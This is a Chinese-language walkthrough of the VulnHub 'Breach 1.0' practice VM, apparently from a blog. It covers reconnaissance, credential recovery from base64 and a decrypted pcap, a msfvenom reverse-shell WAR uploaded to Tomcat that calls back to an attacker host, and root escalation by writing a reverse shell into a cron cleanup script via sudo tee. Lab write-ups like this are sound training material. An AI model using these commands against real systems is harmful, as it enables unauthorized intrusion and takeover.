# 原创
：  VulnHub渗透测试实战靶场 - Breach 1.0

# VulnHub渗透测试实战靶场 - Breach 1.0

#### Vulnhub - Breach-1.0

## 环境下载

> 
戳此进行[环境下载](https://download.vulnhub.com/breach/Breach-1.0.zip)


## Breach-1.0靶机搭建

> 
将下载好的靶机环境，用VMware导入即可使用


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6e7f556ae5e5404ab07825ea8eccd520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7dd12027f7ec4186b3eff48bcfcaad7f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
VMware虚拟机配置有静态IP地址：`192.168.110.140`，需要将虚拟机网卡设置为`host-only`方式



<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/1c51b0bfd71249e8a942dcc4bf2c24db.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4c8546fa6cbe4d71baba2d6afe141bae.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9669faf01cab4e6ea78fdab57461e283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

## 渗透测试

### 信息搜集

> 
使用`arp-scan`来检测我们的目标IP：`sudo arp-scan -l`


> 
使用`nmap`扫描开放的端口：`sudo nmap -sS -A 192.168.110.140 -oN Breach.txt`，发现端口基本上都是开放的，直接访问80端口


### 漏洞挖掘

> 
查看源码发现base64字符串


> 
两次base64解密后得到：`pgibbons:damnitfeel$goodtobeagang$ta`


> 
点击图片后发现会跳转到另外一个存在登录选项的页面<br/> 用前面解码得到的`pgibbons:damnitfeel$goodtobeagang$ta`进行登录


> 
搜索相关漏洞，测试后发现无法利用，但是注意到有三封邮件，在第三封邮件中发现有一个peter的SSL证书被保存在`192.168.110.140/.keystore`


> 
keystore是存储公私密钥的一种文件格式，访问`http://192.168.110.140/.keystore`下载包含SSL证书的密钥库keystore文件


> 
依次访问左边的菜单树，点击每个菜单栏：



<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9c19c69c362d4f88b4a7922942a37ad2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6af9a2e0add0446fa916eb4f40dfbdc9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/1d4a8067359f4fcabdfe5edb7549cec5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
在View Account菜单进入界面的页面中的Content中存在一个链接`Content SSL implementation test capture`<br/> 点击链接跳转到`http://192.168.110.140/impresscms/modules/content/content.php?content_id=1`，发现一个流量包


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d13f000e903e482bb8ed79973d37a202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2cc33ea9b0794e98b60b26b0fa8b2ff1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
用wireshark打开下载的pacp包，发现内容经过了SSL加密，由下载页面的提示得到密码为`tomcat`，先查看`keystore`这个密匙库里面的所有证书


> 
从密钥库导出.p12证书：`sudo keytool -importkeystore -srckeystore keystore -destkeystore tomcatkeystore.p12 -deststoretype pkcs12 -srcalias tomcat`，在Wireshark中打开`_SSL_test_phase1.pcap`流量包文件，将`tomcatkeystore.p12`证书导入Wireshark，选择菜单：编辑–首选项–Protocols–SSL，点击右边的Edit


> 
导入SSL证书之后，发现部分TLS变成了HTTP，发现从192.168.110.129到192.168.110.140的攻击流量包，其中有cmd命令马执行了id命令，攻击者上传了两张图片，疑似图片马，但是命令马无法直接访问，需要登录tomcat后台


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b936447e8a4a428ab331fe14f990ee86.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2c6061a9b9a4482792b74270b54843d2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
继续观察流量包，发现一个Unauthorized的认证包，该request和response包含了Tomcat后台的登录地址：`https://192.168.110.140:8443/_M@nag3Me/html`


> 
发现包含登录用户名密码的数据包， 采用`http basic`认证<br/> 认证数据包为：`Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC`<br/> Tomcat后台登录用户名：`tomcat`，密码：`Tt\5D8F(#!*u=G)4m7zB`


> 
这里测试后发现直接访问网站貌似不得行，利用burpsuite代理访问成功


### getshell

> 
Tomcat后台getshell是有标准姿势的，测试后发现上传的马很快就会消失<br/> 利用msf生成一个war格式的反弹shell：`msfvenom -p java/meterpreter/reverse_tcp lhost=192.168.110.128 lport=1234 -f war -o shell.war`


> 
用msf开启监听：`use exploit/multi/handler`，将生成的war格式的反弹shell马上传到Tomcat<br/> 马上访问`https://192.168.110.140:8443/shell/`，成功反弹shell


### 提权

> 
将shell升级为 tty，得到一个交互式的shell：`python -c 'import pty;pty.spawn("/bin/bash")'`


> 
收集主机信息，发现没有内核提权，在`/etc/passwd`发现`milton`和`blumbergh`用户


> 
查阅网站信息时发现在`/var/www/5446`文件夹内存在mysql数据库连接文件


> 
登录mysql数据库，发现milton的密码，将得到的哈希后的密码解密得到明文密码：`thelaststraw`


> 
登录milton，发现它并不属于sudo组，看到历史命令中通过su提权到了blumbergh用户，猜测应该有blumbergh用户的密码


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/e49c7053f96e4c28b60085bb3025d7b5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6d9e0e7d3efd4447aceae991b88d2634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
在最开始时发现了一些图片，在bill.png中找到了密码：`coffeestains`


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9fbe01a24b06421b93441fee1982331d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b8f60925b474410f97ae6a783f3c529a.png#pic_center"/>

> 
切换到blumbergh用户，`sudo -l`查看权限，用户能够以root权限执行这tee程序和tidyup.sh脚本：`/usr/bin/tee`和`/usr/share/cleanup/tidyup.sh`，其中tee命令用于读取标准输入的数据，并将其内容输出成文件，tidyup.sh是清理脚本


> 
向tidyup.sh中写入反弹shell命令，由于能够以root权限运行tee命令，即可以用tee命令写tidyup.sh



> 
起一个监听，成功反弹shell，查看权限


> 
flag图片

